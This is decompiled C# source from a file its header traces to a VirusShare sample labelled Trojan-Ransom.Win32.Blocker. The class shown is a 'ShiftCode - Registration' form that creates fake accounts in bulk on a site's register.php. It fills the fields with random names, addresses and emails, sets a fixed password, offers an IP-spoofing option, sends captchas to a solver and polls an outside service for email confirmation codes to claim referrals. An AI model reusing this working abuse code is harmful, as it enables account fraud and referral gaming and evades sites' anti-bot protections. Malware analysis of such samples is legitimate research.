// Decompiled with JetBrains decompiler
// Type: SC_aio.reg
// Assembly: SCaio, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4039BEB0-723F-44D4-B6A2-6115173D2A3D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.asho-8d599606a9e08d397b994f3c1f6ab611585cb198.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SC_aio.My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace SC_aio
{
  [DesignerGenerated]
  public class reg : Form
  {
    private IContainer components;
    [AccessedThroughProperty("ListBox1")]
    private ListBox _ListBox1;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("refu")]
    private TextBox _refu;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("profanity")]
    private CheckBox _profanity;
    [AccessedThroughProperty("spoof")]
    private CheckBox _spoof;
    [AccessedThroughProperty("randomemail")]
    private CheckBox _randomemail;
    private Random rand;
    private string status;
    private int done;

    public reg()
    {
      this.rand = new Random();
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.ListBox1 = new ListBox();
      this.Button1 = new Button();
      this.Label1 = new Label();
      this.refu = new TextBox();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.profanity = new CheckBox();
      this.spoof = new CheckBox();
      this.randomemail = new CheckBox();
      this.SuspendLayout();
      this.ListBox1.FormattingEnabled = true;
      ListBox listBox1_1 = this.ListBox1;
      Point point1 = new Point(12, 12);
      Point point2 = point1;
      listBox1_1.Location = point2;
      this.ListBox1.Name = "ListBox1";
      ListBox listBox1_2 = this.ListBox1;
      Size size1 = new Size(281, 69);
      Size size2 = size1;
      listBox1_2.Size = size2;
      this.ListBox1.TabIndex = 0;
      Button button1_1 = this.Button1;
      point1 = new Point(12, 134);
      Point point3 = point1;
      button1_1.Location = point3;
      this.Button1.Name = "Button1";
      Button button1_2 = this.Button1;
      size1 = new Size(281, 23);
      Size size3 = size1;
      button1_2.Size = size3;
      this.Button1.TabIndex = 1;
      this.Button1.Text = "Register";
      this.Button1.UseVisualStyleBackColor = true;
      this.Label1.AutoSize = true;
      Label label1_1 = this.Label1;
      point1 = new Point(12, 91);
      Point point4 = point1;
      label1_1.Location = point4;
      this.Label1.Name = "Label1";
      Label label1_2 = this.Label1;
      size1 = new Size(96, 13);
      Size size4 = size1;
      label1_2.Size = size4;
      this.Label1.TabIndex = 2;
      this.Label1.Text = "Referral username:";
      TextBox refu1 = this.refu;
      point1 = new Point(114, 88);
      Point point5 = point1;
      refu1.Location = point5;
      this.refu.Name = "refu";
      TextBox refu2 = this.refu;
      size1 = new Size(179, 20);
      Size size5 = size1;
      refu2.Size = size5;
      this.refu.TabIndex = 3;
      this.profanity.AutoSize = true;
      CheckBox profanity1 = this.profanity;
      point1 = new Point(15, 111);
      Point point6 = point1;
      profanity1.Location = point6;
      this.profanity.Name = "profanity";
      CheckBox profanity2 = this.profanity;
      size1 = new Size(70, 17);
      Size size6 = size1;
      profanity2.Size = size6;
      this.profanity.TabIndex = 5;
      this.profanity.Text = "Profanity ";
      this.profanity.UseVisualStyleBackColor = true;
      this.spoof.AutoSize = true;
      CheckBox spoof1 = this.spoof;
      point1 = new Point(226, 111);
      Point point7 = point1;
      spoof1.Location = point7;
      this.spoof.Name = "spoof";
      CheckBox spoof2 = this.spoof;
      size1 = new Size(67, 17);
      Size size7 = size1;
      spoof2.Size = size7;
      this.spoof.TabIndex = 6;
      this.spoof.Text = "Spoof IP";
      this.spoof.UseVisualStyleBackColor = true;
      this.randomemail.AutoSize = true;
      CheckBox randomemail1 = this.randomemail;
      point1 = new Point(106, 111);
      Point point8 = point1;
      randomemail1.Location = point8;
      this.randomemail.Name = "randomemail";
      CheckBox randomemail2 = this.randomemail;
      size1 = new Size(94, 17);
      Size size8 = size1;
      randomemail2.Size = size8;
      this.randomemail.TabIndex = 7;
      this.randomemail.Text = "Random Email";
      this.randomemail.UseVisualStyleBackColor = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(305, 161);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.randomemail);
      this.Controls.Add((Control) this.spoof);
      this.Controls.Add((Control) this.profanity);
      this.Controls.Add((Control) this.refu);
      this.Controls.Add((Control) this.Label1);
      this.Controls.Add((Control) this.Button1);
      this.Controls.Add((Control) this.ListBox1);
      this.Name = nameof (reg);
      this.Text = "ShiftCode - Registration";
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual ListBox ListBox1
    {
      get => this._ListBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ListBox1 = value;
    }

    internal virtual Button Button1
    {
      get => this._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
        if (this._Button1 != null)
          this._Button1.Click -= eventHandler;
        this._Button1 = value;
        if (this._Button1 == null)
          return;
        this._Button1.Click += eventHandler;
      }
    }

    internal virtual Label Label1
    {
      get => this._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual TextBox refu
    {
      get => this._refu;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._refu = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual CheckBox profanity
    {
      get => this._profanity;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._profanity = value;
    }

    internal virtual CheckBox spoof
    {
      get => this._spoof;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._spoof = value;
    }

    internal virtual CheckBox randomemail
    {
      get => this._randomemail;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._randomemail = value;
    }

    public string register(string dom, string @ref)
    {
      string username = "";
      if (this.spoof.Checked)
        MyProject.Forms.aio.spoofip();
      else
        MyProject.Forms.aio.sip = "";
      if (MyProject.Forms.aio.scmembert.Text.Length >= 1)
      {
        MyProject.Forms.aio.scmembert.Text = "";
        MyProject.Forms.aio.Button1.PerformClick();
      }
      string str1;
      try
      {
        string str2 = !Versioned.IsNumeric((object) @ref) ? (@ref.Length < 4 ? "" : "?ref=" + @ref) : "?refid=" + @ref;
        string str3 = Conversions.ToString(MyProject.Forms.aio.sendPost("http://" + dom + "/members/register.php" + str2, ""));
        string postData = "next=1&path=&remember=1&terms=1&mailinglist=0";
        string str4 = "";
        string str5 = str3;
        string str6 = "graynearme";
        string str7 = "";
        int length = str6.Length;
        int num1 = checked (2 + this.rand.Next(5));
        string str8;
        if (this.randomemail.Checked)
        {
          while (num1 > 0)
          {
            str7 = this.rand.Next(2) != 1 ? str7 + MyProject.Forms.aio.randSelect(MyProject.Forms.aio.words) : str7 + MyProject.Forms.aio.rand.Next(9).ToString();
            checked { --num1; }
          }
          str8 = (str7 + "@" + MyProject.Forms.aio.randSelect(MyProject.Forms.aio.emaildomains)).ToLower();
        }
        else
        {
          int startIndex;
          while (startIndex != length)
          {
            str7 += str6.Substring(startIndex, 1);
            if (this.rand.Next(0, 2) == 1)
              str7 += ".";
            checked { ++startIndex; }
          }
          str8 = this.rand.Next(0, 2) != 1 ? str7 + "@googlemail.com" : str7 + "@gmail.com";
        }
        string Left1 = "none";
        while (str5.Contains("<input"))
        {
          string str9 = str5.Remove(0, str5.IndexOf("<input"));
          str5 = str9.Remove(0, checked (str9.IndexOf("name=") + 6));
          string Left2 = str5.Split('"')[0];
          int num2;
          if (Operators.CompareString(Left2, "password", false) == 0 | Operators.CompareString(Left2, "password2", false) == 0)
            str4 = "leet123";
          else if (Operators.CompareString(Left2, "first", false) == 0)
            str4 = MyProject.Forms.aio.randSelect(MyProject.Forms.aio.firstnames);
          else if (Operators.CompareString(Left2, "last", false) == 0)
            str4 = MyProject.Forms.aio.randSelect(MyProject.Forms.aio.lastnames);
          else if (Operators.CompareString(Left2, "email", false) == 0 | Operators.CompareString(Left2, "email2", false) == 0)
            str4 = str8;
          else if (Operators.CompareString(Left2, "username", false) == 0)
          {
            if (this.profanity.Checked)
            {
              username = MyProject.Forms.aio.randSelect(MyProject.Forms.aio.profanity);
            }
            else
            {
              username = MyProject.Forms.aio.randSelect(MyProject.Forms.aio.words);
              if (username.Length < 4 | MyProject.Forms.aio.rand.Next(1, 5) == 1)
              {
                string str10 = username;
                num2 = this.rand.Next(1, 9999);
                string str11 = num2.ToString();
                username = str10 + str11;
              }
              else if (MyProject.Forms.aio.rand.Next(1, 3) == 1)
              {
                string str12 = username;
                num2 = this.rand.Next(1, 99);
                string str13 = num2.ToString();
                username = str12 + str13;
              }
            }
            str4 = username;
          }
          else if (Operators.CompareString(Left2, "billingAddress1", false) == 0)
          {
            string[] strArray1 = new string[5];
            string[] strArray2 = strArray1;
            num2 = this.rand.Next(1, 50);
            string str14 = num2.ToString();
            strArray2[0] = str14;
            strArray1[1] = " ";
            strArray1[2] = MyProject.Forms.aio.randSelect(MyProject.Forms.aio.addresses);
            strArray1[3] = " ";
            strArray1[4] = MyProject.Forms.aio.randSelect(MyProject.Forms.aio.roads);
            str4 = string.Concat(strArray1);
          }
          else if (Operators.CompareString(Left2, "billingAddress2", false) == 0)
            str4 = "";
          else if (Operators.CompareString(Left2, "billingState", false) == 0)
          {
            num2 = checked (1 + MyProject.Forms.aio.rand.Next(62));
            str4 = num2.ToString();
          }
          else if (Operators.CompareString(Left2, "billingZip", false) == 0)
          {
            num2 = checked (10000 + MyProject.Forms.aio.rand.Next(32999));
            str4 = num2.ToString();
          }
          else if (Operators.CompareString(Left2, "billingCity", false) == 0)
            str4 = MyProject.Forms.aio.randSelect(MyProject.Forms.aio.cities);
          else if (Operators.CompareString(Left2, "secID", false) == 0)
          {
            str4 = str5.Remove(0, checked (str5.IndexOf("value=") + 7)).Split('"')[0];
            Left1 = str4;
          }
          else
            str4 = Operators.CompareString(Left2, "secCode", false) != 0 ? (Operators.CompareString(Left2, nameof (@ref), false) != 0 ? Conversions.ToString(MyProject.Forms.aio.randLetters((object) 4, (object) 12)) : (@ref.Length < 4 ? "" : @ref)) : "captchahere";
          if (!postData.Contains(Left2))
            postData = postData + "&" + Left2 + "=" + str4;
        }
        string str15 = str3;
        while (str15.Contains("<select"))
        {
          string str16 = str15.Remove(0, str15.IndexOf("<select"));
          str15 = str16.Remove(0, checked (str16.IndexOf("name=") + 6));
          string Left3 = str15.Split('"')[0];
          if (Left3.Contains("Month"))
            str4 = Conversions.ToString(MyProject.Forms.aio.rand.Next(1, 12));
          else if (Left3.Contains("Day"))
            str4 = Conversions.ToString(MyProject.Forms.aio.rand.Next(1, 28));
          else if (Left3.Contains("Year"))
            str4 = Conversions.ToString(MyProject.Forms.aio.rand.Next(1935, 1992));
          else if (Operators.CompareString(Left3, "billingState", false) != 0)
            str4 = Conversions.ToString(MyProject.Forms.aio.randLetters((object) 4, (object) 12));
          if (!postData.Contains(Left3))
            postData = postData + "&" + Left3 + "=" + str4;
        }
        string str17 = str3;
        while (str17.Contains("<textarea"))
        {
          string str18 = str17.Remove(0, str17.IndexOf("<textarea"));
          str17 = str18.Remove(0, checked (str18.IndexOf("name=") + 6));
          string str19 = str17.Split('"')[0];
          if (!str19.Contains("nothing"))
            str4 = Conversions.ToString(MyProject.Forms.aio.randLetters((object) 4, (object) 12));
          if (!postData.Contains(str19))
            postData = postData + "&" + str19 + "=" + str4;
        }
        if (Operators.CompareString(Left1, "none", false) != 0)
          postData = postData.Replace("captchahere", Conversions.ToString(MyProject.Forms.captcha.solve("http://" + dom + "/security/image.php?id=" + Left1)));
        string str20 = Conversions.ToString(MyProject.Forms.aio.sendPost("http://" + dom + "/members/register.php" + str2, postData));
        if (str20.Contains("<th>Error"))
        {
          string str21 = str20.Remove(0, str20.IndexOf("<th>Error"));
          str1 = "Error: " + str21.Remove(0, checked (str21.IndexOf("<li>") + 4)).Split('<')[0];
          goto label_86;
        }
        else
        {
          if (str20.Contains("Confirm"))
          {
            string str22 = str20.Remove(0, checked (str20.IndexOf("&mid=") + 5)).Split('"')[0];
            string Left4 = "fail";
            int num3 = 25;
            while (Operators.CompareString(Left4, "fail", false) == 0)
            {
              Left4 = Conversions.ToString(MyProject.Forms.aio.sendPost("http://incent.tv/email.php?email=" + str8, ""));
              Thread.Sleep(1000);
              checked { --num3; }
              if (num3 == 0)
              {
                str1 = "Error: Unable to confirm email.";
                goto label_86;
              }
            }
            Conversions.ToString(MyProject.Forms.aio.sendPost("http://" + dom + "/members/welcome.php?confirm&mid=" + str22, "code=" + Left4 + "&do=Confirm"));
          }
          if (MyProject.Forms.aio.scmembert.Text.Length == 0)
          {
            MyProject.Forms.aio.scmembert.Text = username + "%3A12f2011d1a78cb2376c55f573362fb2b";
            MyProject.Forms.aio.Button1.PerformClick();
          }
          if (MyProject.Forms.aio.autocontrolled)
          {
            int num4 = 5;
            while (!MyProject.Forms.aio.signuptosite(username) && num4 != 0)
              checked { --num4; }
          }
          str1 = "Successfully signed up as " + username + ".";
          goto label_86;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        if (!MyProject.Forms.aio.autocontrolled)
        {
          int num = (int) Interaction.MsgBox((object) exception.ToString());
          ProjectData.ClearProjectError();
        }
        else
        {
          str1 = exception.ToString();
          ProjectData.ClearProjectError();
          goto label_86;
        }
      }
      return "Fail";
label_86:
      return str1;
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      this.ListBox1.Items.Add((object) this.register(MyProject.Forms.aio.domain, this.refu.Text));
      this.ListBox1.SelectedIndex = checked (this.ListBox1.Items.Count - 1);
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.status, "", false) == 0)
        return;
      this.ListBox1.Items.Add((object) this.status);
      this.ListBox1.SelectedItem = (object) checked (this.ListBox1.Items.Count - 1);
      this.status = "";
    }
  }
}
